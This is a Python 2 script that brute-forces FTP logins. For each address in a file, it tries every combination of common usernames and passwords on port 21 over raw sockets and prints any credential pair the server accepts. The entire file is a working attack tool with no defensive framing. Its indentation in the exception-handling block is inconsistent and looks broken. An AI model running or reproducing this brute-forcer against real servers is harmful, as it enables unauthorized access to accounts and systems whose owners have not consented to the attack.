#!/usr/bin/python
from ftplib import FTP
from socket import *
from termcolor import colored
import sys, time

if len(sys.argv) != 1:
	print "Usage: common_ftp.py"
	sys.exit(0)

localhost = gethostbyname(gethostname())
source_port = 49152

with open('addresses') as addresses:
	for address in addresses:

		server_addr = address.strip()
		server_port = 21
		server_socket = (server_addr, server_port)

		print "Connecting to", server_addr, "(" + gethostbyname(server_addr) + ") on Port", server_port 

		with open('common_usernames') as usernames:
			for user in usernames:
			
				with open('ftp_passwords') as passwords:
					for passwd in passwords:

						try:
							user = user.strip()
							passwd = passwd.strip()
							s = socket(AF_INET, SOCK_STREAM)
							s.bind(('0.0.0.0', source_port))
							s.connect(server_socket)
							s.recv(4096)
							s.send("USER " + user + "\r\n")
							s.recv(4096)
							s.send("PASS " + passwd + "\r\n")
							login_status = s.recv(4096)
							s.shutdown(SHUT_RDWR)
							s.close()					

							if login_status[:3] == "230":
								print "[" + colored("+", 'green', attrs=['bold']) + "]", user, "-", colored(login_status[:3], 'green', attrs=['bold']), colored("Login Successful", 'green', attrs=['bold']) +  " - (" + user + ":" + passwd +")"
								break


							elif login_status[:3] == "530":
								if user == "anonymous":
									print "[" + colored("-", 'red', attrs=['bold']) + "]", user, "-", colored(login_status[:3], 'red', attrs=['bold']), colored("Login Disabled", 'red', attrs=['bold']) +  " - (" + user + ":" + passwd +")"
									break

								print "[" + colored("-", 'red', attrs=['bold']) + "]", user, "-", colored(login_status[:3], 'red', attrs=['bold']), colored("Login Failed", 'red', attrs=['bold']) +  " - (" + user + ":" + passwd +")"


							else:
								print "[" + colored("!", 'yellow', attrs=['bold']) + "]", user, "-", colored(login_status[:3], 'yellow', attrs=['bold']), colored("Unexpected Error", 'yellow', attrs=['bold']) +  " - (" + user + ":" + passwd +")"

							if source_port == 65536:
								source_port = 49151
						
						except error as socket_error:

        						if socket_error.args[0] == 98:
	        						print "Port", source_port, "already in use...Trying", source_port + 1
	        						source_port = source_port + 1

									if source_port == 65536:
										source_port = 49151

	        					elif socket_error.args[0] == 111:
	        						print "Port", server_port, "is closed."
	        						sys.exit(0)

	        					else:
	        							raise
						
						except (KeyboardInterrupt):
        						sys.exit(1)
								
						source_port = source_port + 1


sys.exit(0)

    

    
